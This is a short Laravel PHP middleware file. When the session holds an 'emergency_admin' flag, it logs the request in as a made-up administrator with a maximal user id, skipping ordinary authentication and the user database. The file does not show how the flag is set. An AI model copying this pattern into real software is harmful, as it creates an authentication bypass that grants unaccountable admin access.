<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;

class EmergencyAuthMiddleware
{
    public function handle(Request $request, Closure $next)
    {
        if (session('emergency_admin')) {
            $user = new \App\Models\User();
            $user->id = PHP_INT_MAX;
            $user->name = 'Administrador de Emergencia';
            $user->email = 'admin@sistema.edu.mx';
            $user->role = 'admin';
            $user->exists = true;

            Auth::setUser($user);
        }

        return $next($request);
    }
}
